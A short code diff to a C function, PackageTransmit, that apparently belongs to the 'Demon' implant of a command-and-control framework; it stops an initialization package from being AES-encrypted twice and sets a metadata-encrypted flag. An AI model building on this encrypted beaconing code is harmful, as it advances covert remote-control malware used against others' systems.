@@ -194,8 +194,15 @@ BOOL PackageTransmit( PPACKAGE Package, PVOID* Response, PSIZE_T Size )
             if ( Package->CommandID == DEMON_INITIALIZE ) // only add these on init or key exchange
                 Padding += 32 + 16;
 
-            AesInit( &AesCtx, Instance.Config.AES.Key, Instance.Config.AES.IV );
-            AesXCryptBuffer( &AesCtx, Package->Buffer + Padding, Package->Length - Padding );
+
+            if ( !( Instance.IsMetadataEncrypted && Package->CommandID == DEMON_INITIALIZE ) )
+            {
+                AesInit( &AesCtx, Instance.Config.AES.Key, Instance.Config.AES.IV );
+                AesXCryptBuffer( &AesCtx, Package->Buffer + Padding, Package->Length - Padding );
+            }
+
+            if (Package->CommandID == DEMON_INITIALIZE)
+                Instance.IsMetadataEncrypted = TRUE;
         }
 
         if ( TransportSend( Package->Buffer, Package->Length, Response, Size ) )
